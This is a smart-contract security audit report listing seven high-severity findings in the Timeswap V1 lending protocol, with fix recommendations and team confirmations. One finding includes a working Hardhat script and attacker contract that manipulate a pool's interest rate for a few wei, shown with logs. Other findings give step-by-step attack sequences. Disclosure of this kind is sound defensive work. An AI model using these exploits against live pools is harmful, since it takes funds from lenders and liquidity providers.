[H-01]TimeswapPair.sol#borrow()Improper implementation allows attacker to increasepool.state.zto a large value
Submitted by WatchPug
In the current implementation,borrow()takes a user input value ofzIncrease, while the actual collateral asset transferred in is calculated at L319, the state ofpool.state.zstill increased by the value of the user’s input at L332.
Even though a large number ofzIncreasemeans that the user needs to add more collateral, the attacker can use a dust amountxDecrease(1 wei for example) so that the total collateral needed is rather small.
Plus, the attacker can alwayspay()the dust amount of loan to get back the rather large amount of collateral added.
https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338
functionborrow(uint256maturity,addressassetTo,addressdueTo,uint112xDecrease,uint112yIncrease,uint112zIncrease,bytescalldatadata)externaloverridelockreturns(uint256id,DuememorydueOut) {require(block.timestamp<maturity,'E202');require(assetTo!=address(0) &&dueTo!=address(0),'E201');require(assetTo!=address(this) &&dueTo!=address(this),'E204');require(xDecrease>0,'E205');Poolstoragepool=pools[maturity];require(pool.state.totalLiquidity>0,'E206');BorrowMath.check(pool.state,xDecrease,yIncrease,zIncrease,fee);dueOut.debt=BorrowMath.getDebt(maturity,xDecrease,yIncrease);dueOut.collateral=BorrowMath.getCollateral(maturity,pool.state,xDecrease,zIncrease);dueOut.startBlock=BlockNumber.get();Callback.borrow(collateral,dueOut.collateral,data);id=pool.dues[dueTo].insert(dueOut);pool.state.reserves.asset-=xDecrease;pool.state.reserves.collateral+=dueOut.collateral;pool.state.totalDebtCreated+=dueOut.debt;pool.state.x-=xDecrease;pool.state.y+=yIncrease;pool.state.z+=zIncrease;asset.safeTransfer(assetTo,xDecrease);emitSync(maturity,pool.state.x,pool.state.y,pool.state.z);emitBorrow(maturity,msg.sender,assetTo,dueTo,xDecrease,id,dueOut);}
https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79
functiongetCollateral(uint256maturity,IPair.Statememorystate,uint112xDecrease,uint112zIncrease)internalviewreturns(uint112collateralIn) {uint256_collateralIn=maturity;_collateralIn-=block.timestamp;_collateralIn*=zIncrease;_collateralIn=_collateralIn.shiftRightUp(25);uint256minimum=state.z;minimum*=xDecrease;uint256denominator=state.x;denominator-=xDecrease;minimum=minimum.divUp(denominator);_collateralIn+=minimum;collateralIn=_collateralIn.toUint112();}
Proof of Concept
Near the maturity time, the attacker can do the following:
borrow()a dust amount of assets (xDecrease= 1 wei) and increasepool.state.zto an extremely large value (20x of previousstate.zin our tests);pay()the loan and get back the collateral;lend()a regular amount ofstate.x, get a large amount of insurance token;burn()the insurance token and get a large portion of the collateral assets from the defaulted loans.
Recommendation
Consider makingpair.borrow()to beonlyConvenience, so thatzIncreasewill be a computed value (based onxDecreaseand current state) rather than a user input value.
Mathepreneur (Timeswap) confirmed
[H-02]TimeswapConvenience.sol#borrowGivenDebt()Attacker can increasestate.yto an extremely large value with a dust amount ofassetOut
Submitted by WatchPug
https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53
This issue is similar to the two previous issues related tostate.ymanipulation. Unlike the other two issues, this function is not onTimeswapPair.solbut onTimeswapConvenience.sol, therefore this can not be solved by addingonlyConveniencemodifier.
Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.
Impact
Whenpool.state.yis extremely large, many core features of the protocol will malfunction, as the arithmetic related tostate.ycan overflow. For example:
LendMath.check():https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28
BorrowMath.check():https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31
An attacker can setstate.yto a near overflow value, thenlend()to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.
Mathepreneur (Timeswap) confirmed
[H-03] Manipulation of the Y State Results in Interest Rate Manipulation
Submitted by Rhynorater, also found by harleythedog, hyh, and WatchPug
Due to lack of constraints on user input in theTimeswapPair.sol#mintfunction, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.
Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I’m going to give it a go.
Proof of Concept
The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.
Consider the following HardHat script:
consthre=require("hardhat");//jtok is asset//usdc is collatasyncfunctionlaunchTestTokens(tokenDeployer){//Launch a tokenconstTestToken=awaitethers.getContractFactory("TestToken",signer=tokenDeployer);consttt=awaitTestToken.deploy("JTOK","JTOK",1000000000000000)consttt2=awaitTestToken.deploy("USDC","USDC",1000000000000000)letres=awaittt.balanceOf(tokenDeployer.address)letres2=awaittt.balanceOf(tokenDeployer.address)console.log("JTOK balance: "+res)console.log("USDC balance: "+res2)return[tt,tt2]}asyncfunctiondeployAttackersContract(attacker,jtok,usdc){constAtt=awaitethers.getContractFactory("Attacker",signer=attacker)constatakcontrak=awaitAtt.deploy(jtok.address,usdc.address)returnatakcontrak}asyncfunctiondeployLPContract(lp,jtok,usdc){constLP=awaitethers.getContractFactory("LP",signer=lp)constlpc=awaitLP.deploy(jtok.address,usdc.address)returnlpc}asyncfunctionmain() {const[tokenDeployer,lp,attacker] =awaitethers.getSigners();letbalance=awaittokenDeployer.getBalance()letfactory=awaitethers.getContractAt("TimeswapFactory","0x5FbDB2315678afecb367f032d93F642f64180aa3",signer=tokenDeployer)//let [jtok, usdc] = await launchTestTokens(tokenDeployer)letjtok=awaitethers.getContractAt("TestToken","0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6",signer=tokenDeployer)letusdc=awaitethers.getContractAt("TestToken","0x8a791620dd6260079bf849dc5567adc3f2fdc318",signer=tokenDeployer)console.log("Jtok: "+jtok.address)console.log("USDC: "+usdc.address)//Create Pair//let txn = await factory.createPair(jtok.address, usdc.address)pairAddress=awaitfactory.getPair(jtok.address,usdc.address)pair=awaitethers.getContractAt("TimeswapPair",pairAddress,signer=tokenDeployer)console.log("Pair address: "+pairAddress);// Deploy LP//let lpc = await deployLPContract(lp, jtok, usdc)letlpc=awaitethers.getContractAt("LP","0x948b3c65b89df0b4894abe91e6d02fe579834f8f",signer=lp)letjtokb=awaitjtok.balanceOf(lpc.address)letusdcb=awaitusdc.balanceOf(lpc.address)console.log("LP Jtok: "+jtokb)console.log("LP USDC: "+usdcb)//let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)letres=awaitpair.constantProduct(1641859791);console.log("Post LP Constants:",res);letatakcontrak=awaitdeployAttackersContract(attacker,jtok,usdc)jtokb=awaitjtok.balanceOf(atakcontrak.address)usdcb=awaitusdc.balanceOf(atakcontrak.address)console.log("Attacker Jtok: "+jtokb)console.log("Attacker USDC: "+usdcb)//mint some tokenslettxn2=awaitatakcontrak.timeswapMint(1641859791,15,pairAddress)letres2=awaitpair.constantProduct(1641859791);console.log("Post Attack Constants:",res2);}main().then(()=>process.exit(0))
First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:
pragmasolidity=0.8.4;import"hardhat/console.sol";import{ITimeswapMintCallback}from"./interfaces/callback/ITimeswapMintCallback.sol";import{IPair}from"./interfaces/IPair.sol";import{IERC20}from'@openzeppelin/contracts/token/ERC20/IERC20.sol';interfaceTestTokenLPisIERC20{functionmmint(uint256amount)external;}contractLPisITimeswapMintCallback{uint112constantSEC_PER_YEAR=31556926;TestTokenLPinternaljtok;TestTokenLPinternalusdc;constructor(address_jtok,address_usdc){jtok=TestTokenLP(_jtok);jtok.mmint(10_000ether);usdc=TestTokenLP(_usdc);usdc.mmint(10_000ether);}functiontimeswapMint(uintmaturity,uint112APR,addresspairAddress)public{uint256maturity=maturity;console.log("Maturity: ",maturity);addressliquidityTo=address(this);addressdueTo=address(this);uint112xIncrease=5_000ether;uint112yIncrease= (APR*xIncrease)/(SEC_PER_YEAR*100);uint112zIncrease= (5*xIncrease)/3;//Static 167% CDPIPair(pairAddress).mint(maturity,liquidityTo,dueTo,xIncrease,yIncrease,zIncrease,"");}functiontimeswapMintCallback(uint112assetIn,uint112collateralIn,bytescalldatadata)overrideexternal{jtok.mmint(100_000ether);usdc.mmint(100_000ether);console.log("Asset requested:",assetIn);console.log("Collateral requested:",collateralIn);//check beforeuint256beforeJtok=jtok.balanceOf(msg.sender);console.log("LP jtok before",beforeJtok);//transferjtok.transfer(msg.sender,assetIn);//check afteruint256afterJtok=jtok.balanceOf(msg.sender);console.log("LP jtok after",afterJtok);//check beforeuint256beforeUsdc=usdc.balanceOf(msg.sender);console.log("LP USDC  before",beforeUsdc);//transferusdc.transfer(msg.sender,collateralIn);//check afteruint256afterUsdc=usdc.balanceOf(msg.sender);console.log("LP USDC After",afterUsdc);}}
Here are the initialization values:
uint112xIncrease=5_000ether;uint112yIncrease= (APR*xIncrease)/(SEC_PER_YEAR*100);uint112zIncrease= (5*xIncrease)/3;//Static 167% CDP
With this configuration, I’ve calculated the interest rate to borrow on this pool using the functions defined here:https://timeswap.gitbook.io/timeswap/deep-dive/borrowingto  be:
yMax: 4.7533146923118e-06Min Interest Rate: 0.009374999999999765Max Interest Rate: 0.14999999999999625zMax: 1666.6666666666667
Around 1% to 15%.
Then, the attacker comes along (see line containinglet atakcontrakand after). The attacker deploys the following contract:
pragmasolidity=0.8.4;import"hardhat/console.sol";import{ITimeswapMintCallback}from"./interfaces/callback/ITimeswapMintCallback.sol";import{IPair}from"./interfaces/IPair.sol";import{IERC20}from'@openzeppelin/contracts/token/ERC20/IERC20.sol';interfaceTestTokenAttisIERC20{functionmmint(uint256amount)external;}contractAttackerisITimeswapMintCallback{uint112constantSEC_PER_YEAR=31556926;TestTokenAttinternaljtok;TestTokenAttinternalusdc;constructor(address_jtok,address_usdc){jtok=TestTokenAtt(_jtok);jtok.mmint(10_000ether);usdc=TestTokenAtt(_usdc);usdc.mmint(10_000ether);}functiontimeswapMint(uintmaturity,uint112APR,addresspairAddress)public{uint256maturity=maturity;console.log("Maturity: ",maturity);addressliquidityTo=address(this);addressdueTo=address(this);uint112xIncrease=3;uint112yIncrease=1000000000000000;uint112zIncrease=5;//Static 167% CDPIPair(pairAddress).mint(maturity,liquidityTo,dueTo,xIncrease,yIncrease,zIncrease,"");}functiontimeswapMintCallback(uint112assetIn,uint112collateralIn,bytescalldatadata)overrideexternal{jtok.mmint(100_000ether);usdc.mmint(100_000ether);console.log("Asset requested:",assetIn);console.log("Collateral requested:",collateralIn);//check beforeuint256beforeJtok=jtok.balanceOf(msg.sender);console.log("Attacker jtok before",beforeJtok);//transferjtok.transfer(msg.sender,assetIn);//check afteruint256afterJtok=jtok.balanceOf(msg.sender);console.log("Attacker jtok after",afterJtok);//check beforeuint256beforeUsdc=usdc.balanceOf(msg.sender);console.log("Attacker USDC  before",beforeUsdc);//transferusdc.transfer(msg.sender,collateralIn);//check afteruint256afterUsdc=usdc.balanceOf(msg.sender);console.log("Attacker USDC After",afterUsdc);}}
Which contains the following settings for a mint:
uint112xIncrease=3;uint112yIncrease=1000000000000000;uint112zIncrease=5;//Static 167% CDP
According to my logs in hardhat:
Maturity:  1641859791Callback before: 8333825816710789998373Asset requested: 3Collateral requested: 6Attacker jtok before 5000000000000000000000Attacker jtok after 5000000000000000000003Attacker USDC  before 8333825816710789998373Attacker USDC After 8333825816710789998379Callback after: 8333825816710789998379Callback expected after: 8333825816710789998379
The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker’s malicious mint is up, the interest rate becomes:
yMax: 0.0002047533146923118Min Interest Rate: 0.40383657499999975Max Interest Rate: 6.461385199999996zMax: 1666.6666666666667
Between 40 and 646 percent.
xyz values before and after:
Post LP Constants: [ BigNumber { value: "5000000000000000000000" },BigNumber { value: "23766573461559" },BigNumber { value: "8333333333333333333333" },x: BigNumber { value: "5000000000000000000000" },y: BigNumber { value: "23766573461559" },z: BigNumber { value: "8333333333333333333333" } ]Attacker Jtok: 10000000000000000000000Attacker USDC: 10000000000000000000000Post Attack Constants: [ BigNumber { value: "5000000000000000000003" },BigNumber { value: "1023766573461559" },BigNumber { value: "8333333333333333333338" },x: BigNumber { value: "5000000000000000000003" },y: BigNumber { value: "1023766573461559" },z: BigNumber { value: "8333333333333333333338" } ]
This result in destruction of the pool.
Mathepreneur (Timeswap) confirmed
CloudEllie (C4) commented:
Warden rhynorater requested that we add to his submission.  See comment for details.
[H-04] Important state updates are made after the callback in the mint() function
Submitted by jayjonah8
In TimeswapPair.sol, themint()function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.
Proof of Concept
https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177https://fravoll.github.io/solidity-patterns/checks_effects_interactions.htmlcross function reentrancyhttps://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
Recommended Mitigation Steps
The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.
Mathepreneur (Timeswap) confirmed and resolved:
https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/107
[H-05] In the lend() function state updates are made after the callback
Submitted by jayjonah8
In TimeswapPair.sol, thelend()function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.
Proof of Concept
https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246https://fravoll.github.io/solidity-patterns/checks_effects_interactions.htmlcross function reentrancyhttps://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
Recommended Mitigation Steps
The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.
Mathepreneur (Timeswap) confirmed and resolved:
https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106
[H-06] borrow() function has state updates after a callback to msg.sender
Submitted by jayjonah8
In TimeswapPair.sol, theborrow()function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.
Proof of Concept
https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322https://fravoll.github.io/solidity-patterns/checks_effects_interactions.htmlcross function reentrancyhttps://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
Recommended Mitigation Steps
The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.
Mathepreneur (Timeswap) confirmed and resolved:
https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/105
[H-07] pay() function has callback to msg.sender before important state updates
Submitted by jayjonah8
In TimeswapPair.sol, thepay()function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.
Proof of Concept
https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369https://fravoll.github.io/solidity-patterns/checks_effects_interactions.htmlcross function reentrancyhttps://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
Recommended Mitigation Steps
The callback “if (assetIn > 0) Callback.pay(asset, assetIn, data);”  should be placed at the end of the pay() function after all state updates have taken place.
Mathepreneur (Timeswap) confirmed and resolved:
https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/104
